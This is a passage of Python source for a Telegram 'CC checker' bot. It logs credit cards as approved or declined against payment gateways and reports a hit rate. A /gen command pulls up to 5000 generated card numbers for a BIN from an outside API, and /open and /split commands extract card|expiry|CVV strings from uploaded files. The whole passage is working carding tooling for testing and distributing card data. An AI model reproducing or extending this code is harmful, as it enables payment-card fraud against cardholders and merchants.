                status = status.replace('❌', '[DECLINED]').replace('✅', '[APPROVED]')
                
                f.write(f"[{datetime.fromtimestamp(int(timestamp)).strftime('%Y-%m-%d %H:%M:%S')}]\n")
                f.write(f"User: {entry.get('user_id', 'N/A')}\n")
                f.write(f"Card: {entry.get('card', 'N/A')}\n")
                f.write(f"Status: {status}\n")
                f.write(f"Response: {entry.get('response', 'N/A')}\n")
                f.write(f"Gateway: {entry.get('gateway', 'N/A')}\n")
                f.write("-" * 40 + "\n")
        
        with open(filename, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"{log_type.capitalize()} logs")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error generating logs: {str(e)}")

@bot.message_handler(commands=['approved'])
def send_approved_cards(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    try:
        send_logs(message.chat.id, "approved")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['declined'])
def send_declined_cards(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    try:
        send_logs(message.chat.id, "declined")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['logs'])
def send_all_logs(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    try:
        send_logs(message.chat.id, "all")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['restrict'])
def restrict_command(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "❌ Usage: /restrict <user_id> <time>\nExample: /restrict 123456 1d2h30m")
        return
    
    try:
        user_id = int(parts[1])
        time_str = parts[2].lower()
        time_parts = {'d': 0, 'h': 0, 'm': 0}
        current_num = ''
        
        for char in time_str:
            if char.isdigit():
                current_num += char
            elif char in time_parts:
                time_parts[char] = int(current_num) if current_num else 0
                current_num = ''
        
        if not any(time_parts.values()):
            bot.reply_to(message, "❌ Invalid time format. Use like 1d2h30m")
            return
        
        users = read_firebase("users_pixel") or {}
        if str(user_id) not in users:
            users[str(user_id)] = {}
        
        restriction_end = datetime.now() + timedelta(
            days=time_parts['d'],
            hours=time_parts['h'],
            minutes=time_parts['m']
        )
        users[str(user_id)]['restricted'] = True
        users[str(user_id)]['restriction_end'] = restriction_end.strftime("%Y-%m-%d %H:%M:%S")
        
        if write_firebase("users_pixel", users):
            bot.reply_to(message, f"✅ User {user_id} restricted for {time_str}.")
        else:
            bot.reply_to(message, "❌ Failed to restrict user.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pban', 'pbang'])
def ban_command(message):
    if not is_owner(message.from_user.id):
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /pban <user_id>")
        return
    
    try:
        user_id = int(parts[1])
        users = read_firebase("users_pixel") or {}
        users[str(user_id)] = {'restricted': True, 'restriction_end': '9999-12-31 23:59:59'}
        
        if write_firebase("users_pixel", users):
            bot.reply_to(message, f"✅ User {user_id} permanently banned.")
        else:
            bot.reply_to(message, "❌ Failed to ban user.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    if not is_admin(message.from_user.id):
        return
    
    stats = read_firebase("stats_pixel") or {}
    total = stats.get('total_checks', 0)
    approved = stats.get('approved', 0)
    declined = stats.get('declined', 0)
    hit_rate = (approved / total * 100) if total > 0 else 0
    
    cpu_percent = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    uptime = datetime.now() - boot_time
    
    response = (
        f"📊 Bot Statistics:\n\n"
        f"🔹 Total Checks: {total}\n"
        f"✅ Approved: {approved}\n"
        f"❌ Declined: {declined}\n"
        f"🎯 Hit Rate: {hit_rate:.2f}%\n\n"
        f"🖥 System Status:\n"
        f"CPU: {cpu_percent}%\n"
        f"Memory: {memory.percent}% used\n"
        f"Disk: {disk.percent}% used\n"
        f"Uptime: {humanize.naturaldelta(uptime)}\n\n"
        f"🔄 Credits refreshed every hour"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['ping'])
def ping_command(message):
    start_time = time.time()
    msg = bot.reply_to(message, "🏓 Pong!")
    end_time = time.time()
    elapsed = (end_time - start_time) * 1000
    
    cpu_percent = psutil.cpu_percent()
    memory = psutil.virtual_memory()
    
    bot.edit_message_text(
        f"🏓 Pong!\n"
        f"⏱ Response Time: {elapsed:.2f}ms\n\n"
        f"🖥 System Status:\n"
        f"CPU: {cpu_percent}%\n"
        f"Memory: {memory.percent}% used\n"
        f"Bot Status: {'🟢 Active' if bot_active else '🔴 Inactive'}\n"
        f"Checker Status: {'🟢 Active' if checker_active else '🔴 Inactive'}",
        chat_id=message.chat.id,
        message_id=msg.message_id
    )


@bot.message_handler(commands=['on', 'off'])
def toggle_bot(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
    
    global bot_active, checker_active
    parts = message.text.split()
    
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /on|off <all|chk>")
        return
    
    command = parts[0].lower()
    target = parts[1].lower()
    new_status = command == 'on'
    
    if target == 'all':
        bot_active = new_status
        checker_active = new_status
        status = "🟢 ON" if new_status else "🔴 OFF"
        bot.reply_to(message, f"✅ Bot status set to {status}")
    elif target == 'chk':
        checker_active = new_status
        status = "🟢 ON" if new_status else "🔴 OFF"
        bot.reply_to(message, f"✅ Checker status set to {status}")
    else:
        bot.reply_to(message, "❌ Invalid target. Use 'all' or 'chk'")

# Add this with your other API endpoints
CC_GENERATOR_URL = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count={}"  # Replace with your actual CC generator API

# Add these command handlers with your other command handlers
@bot.message_handler(commands=['gen'])
def gen_command(message):
    handle_gen_command(message)

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.gen ') or m.text == '.gen'))
def dot_gen_command(message):
    handle_gen_command(message)

def handle_gen_command(message):
    """Handle both /gen and .gen commands without deducting credits"""
    try:
        # Parse command
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /gen BIN [COUNT] or .gen BIN [COUNT]")
            return
        
        bin_input = parts[1]
        if len(bin_input) < 6:
            bot.reply_to(message, "❌ Invalid BIN. BIN must be at least 6 digits.")
            return
        
        # Get BIN info (using your existing function)
        bin_info = get_bin_info(bin_input[:6])
        bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
        country_name = bin_info.get('country_name', 'N/A') if bin_info else 'N/A'
        flag = bin_info.get('country_flag', '🌍') if bin_info else '🌍'
        card_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
        
        # Default behavior - show 10 CCs in message if no count specified
        if len(parts) == 2:
            status_msg = bot.reply_to(message, "🔄 Generating 10 CCs...")
            
            def generate_inline():
                try:
                    response = requests.get(CC_GENERATOR_URL.format(bin_input, 10), timeout=10)
                    if response.status_code == 200:
                        ccs = response.text.strip().split('\n')
                        formatted_ccs = "\n".join(f"<code>{cc}</code>" for cc in ccs)
                        
                        result = f"""
<pre>Generated 10 CCs 💳</pre>

{formatted_ccs}

<pre>BIN-LOOKUP
BIN: {bin_input}
Country: {country_name} {flag}
Type: {card_type}
Bank: {bank}</pre>
"""
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=result,
                                            parse_mode='HTML')
                    else:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text="❌ Failed to generate CCs. Please try again.")
                except Exception as e:
                    bot.edit_message_text(chat_id=message.chat.id,
                                         message_id=status_msg.message_id,
                                         text=f"❌ Error generating CCs: {str(e)}")
            
            threading.Thread(target=generate_inline).start()
        
        # If count is specified, generate a file
        else:
            try:
                count = int(parts[2])
                if count <= 0:
                    bot.reply_to(message, "❌ Count must be at least 1")
                    return
                elif count > 5000:
                    count = 5000
                    bot.reply_to(message, "⚠️ Maximum count is 5000. Generating 5000 CCs.")
                
                status_msg = bot.reply_to(message, f"🔄 Generating {count} CCs... This may take a moment.")
                
                def generate_file():
                    try:
                        # Generate in chunks to avoid memory issues
                        chunk_size = 100
                        chunks = count // chunk_size
                        remainder = count % chunk_size
                        
                        with open(f'ccgen_{bin_input}.txt', 'w') as f:
                            for _ in range(chunks):
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, chunk_size), timeout=10)
                                if response.status_code == 200:
                                    f.write(response.text + '\n')
                                time.sleep(1)  # Be gentle with the API
                            
                            if remainder > 0:
                                response = requests.get(CC_GENERATOR_URL.format(bin_input, remainder), timeout=10)
                                if response.status_code == 200:
                                    f.write(response.text + '\n')
                        
                        # Send the file
                        with open(f'ccgen_{bin_input}.txt', 'rb') as f:
                            bot.send_document(
                                message.chat.id, 
                                f, 
                                caption=f"""
Generated {count} CCs 💳
━━━━━━━━━━━━━━━━━━
BIN: {bin_input}
Country: {country_name} {flag}
Type: {card_type}
Bank: {bank}
━━━━━━━━━━━━━━━━━━
""",
                                parse_mode='HTML'
                            )
                        
                        # Clean up
                        import os
                        os.remove(f'ccgen_{bin_input}.txt')
                        bot.delete_message(message.chat.id, status_msg.message_id)
                    
                    except Exception as e:
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=f"❌ Error generating CCs: {str(e)}")
                
                threading.Thread(target=generate_file).start()
            
            except ValueError:
                bot.reply_to(message, "❌ Invalid count. Please provide a number.")
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Add these command handlers with your other command handlers
@bot.message_handler(commands=['info'])
def info_command(message):
    handle_info_command(message)

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.info') or m.text == '.info'))
def dot_info_command(message):
    handle_info_command(message)

def handle_info_command(message):
    """Show user information in a formatted message"""
    user = message.from_user
    user_id = user.id
    
    # Check if user needs to join channels first (same as other commands)
    if not is_member(user_id):
        show_join_buttons(message)
        return
    
    # Get user data from Firebase
    users = read_firebase("users_pixel") or {}
    user_data = users.get(str(user_id), {})
    
    # Calculate account age
    join_date = user_data.get('first_seen', datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    try:
        join_dt = datetime.strptime(join_date, "%Y-%m-%d %H:%M:%S")
        account_age = (datetime.now() - join_dt).days
    except:
        account_age = 0
    
    # Get stats
    credits = user_data.get('credits', CREDITS_PER_HOUR)
    total_checks = user_data.get('total_checks', 0)
    
    # Get user logs to count approved cards
    user_logs = read_firebase(f"logs_pixel/{user_id}") or {}
    approved_count = sum(1 for log in user_logs.values() if log.get('status') == 'APPROVED')
    
    # Format the response
    response = f"""
════❖ USER INFO ❖════

<b>❖ User:</b> <a href='tg://user?id={user_id}'>{user.first_name}</a>
<b>❖ ID:</b> <code>{user_id}</code>
<b>❖ Joined:</b> {join_date} ({account_age} days ago)

<b>❖ Credits:</b> {credits}/{CREDITS_PER_HOUR}
<b>❖ Total Checks:</b> {total_checks}
<b>❖ Approved Cards:</b> {approved_count}

<b>❖ Status:</b> {'🟢 Active' if not is_restricted(user_id) else '🔴 Restricted'}

"""
    
    bot.reply_to(message, response, parse_mode='HTML')

# Updated gen command to respect join requirements
@bot.message_handler(commands=['gen'])
def gen_command(message):
    if not is_member(message.from_user.id):
        show_join_buttons(message)
        return
    handle_gen_command(message)

@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.gen ') or m.text == '.gen'))
def dot_gen_command(message):
    if not is_member(message.from_user.id):
        show_join_buttons(message)
        return
    handle_gen_command(message)

@bot.message_handler(commands=['open'])
def open_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        first_30 = ccs[:30]
        formatted = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in first_30)

        bot.send_message(message.chat.id, f"✅ Found {len(ccs)} CCs.\n\nHere are the first {len(first_30)}:\n<code>{formatted}</code>", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")



@bot.message_handler(commands=['split'])
def split_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            bot.reply_to(message, "❌ Provide the number of parts. Example: /split 5")
            return
        parts = int(args[1])
        if parts <= 0:
            bot.reply_to(message, "❌ Number of parts must be greater than 0.")
            return

        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        chunk_size = (len(ccs) + parts - 1) // parts
        chunks = [ccs[i:i+chunk_size] for i in range(0, len(ccs), chunk_size)]

        for idx, chunk in enumerate(chunks):
            chunk_text = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in chunk)
            output = io.BytesIO(chunk_text.encode('utf-8'))
            output.name = f'part_{idx+1}.txt'
            bot.send_document(message.chat.id, output)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Background tasks
def background_tasks():
    while True:
        try:
            refresh_credits()
            time.sleep(60)
        except Exception as e:
            print(f"Background task error: {str(e)}")
            time.sleep(60)

# Start background thread
threading.Thread(target=background_tasks, daemon=True).start()

# Initialize Firebase
init_firebase()

print("Bot is running...")
bot.infinity_polling()
